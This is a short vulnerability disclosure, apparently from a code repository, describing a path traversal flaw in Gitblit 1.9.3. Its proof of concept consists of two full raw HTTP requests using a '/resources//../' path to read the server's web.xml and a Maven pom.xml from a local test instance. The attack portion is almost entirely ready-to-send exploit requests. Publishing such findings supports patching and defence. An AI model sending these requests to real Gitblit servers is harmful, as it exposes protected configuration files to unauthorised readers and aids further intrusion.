# Gitblit Path Traversal



## Description

Gitblit is an open source, pure Java Git solution for managing, viewing, and serving **Git** repositories. There is a **Path Traversal** vulnerability in Gitblit V1.9.3 which can read website files.



# Proof of Concept

read `web.xml`

```
GET /resources//../WEB-INF/web.xml HTTP/1.1
Host: 127.0.0.1:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=1arfn8db09ors1a3p1837sgxmh; Gitblit=a9d7b582ef204ffbd9cc2ff18f01d603c069fbeb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1


```

![gitblit](imgs/gitblit.png)



read `pom.xml`

```
GET /resources//../META-INF/maven/com.gitblit/gitblit/pom.xml HTTP/1.1
Host: 127.0.0.1:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=1arfn8db09ors1a3p1837sgxmh; Gitblit=a9d7b582ef204ffbd9cc2ff18f01d603c069fbeb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1


```

![gitblit2](imgs/gitblit2.png)

